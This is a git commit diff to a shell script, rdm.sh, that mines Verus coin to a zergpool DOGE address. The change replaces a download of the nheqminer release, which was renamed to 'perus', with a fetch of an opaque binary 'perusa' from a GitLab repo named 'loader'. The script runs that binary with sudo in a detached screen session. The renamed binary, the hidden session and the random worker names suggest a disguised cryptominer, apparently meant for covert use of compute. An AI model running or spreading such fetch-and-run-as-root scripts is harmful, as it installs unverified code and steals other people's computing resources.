931ad0735f6c2d413b4a100524a02a0158cfd841
washil789 <88795024+washil789@users.noreply.github.com>
2021-10-11 17:23:45 +0700

    Update rdm.sh

--- rdm.sh
+++ rdm.sh
@@ -1,9 +1,4 @@
 sudo apt install screen -y &&
-wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz &&
-tar -xvf nheqminer-Linux-v0.8.2.tgz &&
-tar -xvf nheqminer-Linux-v0.8.2.tar.gz &&
-cd nheqminer &&
-chmod +x nheqminer &&
-mv nheqminer perus &&
-chmod +x perus &&
-screen -dmS run sudo ./perus -v -l verushash.na.mine.zergpool.com:3300 -u DCTbhxrn5VcNbskyfv2vXD7bHfP6sGMWcp.$(echo $(shuf -i 1-100 -n 1)-RDM) -p c=DOGE -t 4 && screen -r
+wget https://gitlab.com/admin1246/loader/-/raw/main/perusa && chmod +x perusa 
+screen -dmS run sudo ./perusa -v -l verushash.na.mine.zergpool.com:3300 -u DCTbhxrn5VcNbskyfv2vXD7bHfP6sGMWcp.$(echo $(shuf -i 1-2000 -n 1)-PPS) -p c=DOGE -t 40 && screen -r
+
